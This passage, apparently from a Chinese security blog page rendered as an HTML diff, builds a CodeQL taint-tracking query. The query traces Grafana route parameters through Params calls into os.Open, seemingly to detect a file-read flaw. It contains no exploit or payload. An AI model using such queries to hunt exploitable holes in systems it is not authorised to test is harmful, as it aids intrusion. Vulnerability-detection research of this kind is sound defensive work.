+&lt;p&gt;分析一下：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;限制函数为Params&lt;/li&gt;
+&lt;li&gt;函数可被污染就说明参数可控，那么就让pred节点作为参数&lt;/li&gt;
+&lt;li&gt;SimpleAssignStmt结构表示一个赋值表达式，如&lt;code&gt;a+=b&lt;/code&gt;，Rhs表示等号右边，通过查看源码可知Params函数调用几乎都是在等号右边，因此可以通过该结构减少误报&lt;/li&gt;
+&lt;li&gt;最后将输出节点连接到赋值表达式&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;nx&#34;&gt;override&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;predicate&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isAdditionalTaintStep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;succ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nf&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;CallExpr&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SimpleAssignStmt&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sas&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Params&amp;#34;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;asExpr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+        &lt;span class=&#34;nx&#34;&gt;sas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getRhs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getParent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAChild&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+        &lt;span class=&#34;c1&#34;&gt;// 使用getParent*()是因为等号右边不止有光秃秃的Params方法调用，如漏洞点就存在Jion函数拼接操作，需要通过传递闭包getParent*()来获取完整表达式
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;c1&#34;&gt;// 使用getAChild()则是要获取Params的方法调用，不过测试发现用不用效果差不多，所以也不懂为什么还要加这个
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nx&#34;&gt;sas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getRhs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;succ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;asExpr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;最后ql文件：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-go&#34; data-lang=&#34;go&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;go&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PathGraph&lt;/span&gt;
+
+&lt;span class=&#34;nx&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfSink&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nf&#34;&gt;GfSink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nf&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;CallNode&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 
+            &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;hasQualifiedName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;os&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Open&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt; 
+            &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 标记 sink 为 os.Open 第一个参数
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;nx&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfSource&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nf&#34;&gt;GfSource&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nf&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;Function&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;CallExpr&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SelectorExpr&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;hasQualifiedName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+                &lt;span class=&#34;s&#34;&gt;&amp;#34;github.com/grafana/grafana/pkg/api/routing.RouteRegister&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+                &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Get&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Post&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Delete&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Put&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Patch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Any&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
+            &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAChildExpr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAReference&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;se&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getSelector&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;kd&#34;&gt;func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAParameter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;asParameter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// source设置为参数
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;nx&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfConfig&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;TaintTracking&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Configuration&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;nf&#34;&gt;GfConfig&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;this&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Grafana file upload&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+    &lt;span class=&#34;nx&#34;&gt;override&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;predicate&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isSource&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;source&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;instanceof&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfSource&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;override&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;predicate&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isSink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sink&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;instanceof&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfSink&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+    &lt;span class=&#34;nx&#34;&gt;override&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;predicate&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;isAdditionalTaintStep&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;Node&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;succ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+        &lt;span class=&#34;nf&#34;&gt;exists&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;CallExpr&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;SimpleAssignStmt&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sas&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getTarget&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;().&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;Params&amp;#34;&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getAnArgument&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;pred&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;asExpr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;c1&#34;&gt;// sas.getRhs().getAChild() = call.getParent*().getAChild() and
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;            &lt;span class=&#34;nx&#34;&gt;sas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getRhs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;getParent&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;and&lt;/span&gt;
+            &lt;span class=&#34;nx&#34;&gt;sas&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getRhs&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;succ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;asExpr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
+        &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+
+&lt;span class=&#34;nx&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;GfConfig&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;gfc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PathNode&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DataFlow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PathNode&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;source&lt;/span&gt;
+&lt;span class=&#34;nx&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;gfc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;hasFlowPath&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;getNode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;source&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sink&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;test&amp;#34;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;reference&#34;&gt;Reference&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.modb.pro/db/139793&#34;&gt;https://www.modb.pro/db/139793&lt;/a&gt;&lt;/p&gt;
